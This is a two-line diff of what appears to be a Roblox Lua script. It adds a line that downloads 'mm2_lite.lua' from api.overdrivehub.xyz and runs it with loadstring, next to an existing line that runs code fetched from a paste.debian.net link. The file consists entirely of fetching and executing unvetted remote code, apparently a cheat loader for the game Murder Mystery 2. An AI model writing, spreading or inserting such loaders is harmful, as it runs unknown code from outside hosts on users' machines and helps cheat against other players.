@@ -1,1 +1,2 @@
+loadstring(game:HttpGet("https://api.overdrivehub.xyz/v1/files/mm2_lite.lua"))()
 loadstring(game:HttpGet("https://paste.debian.net/plainh/9a371fec/", true))()
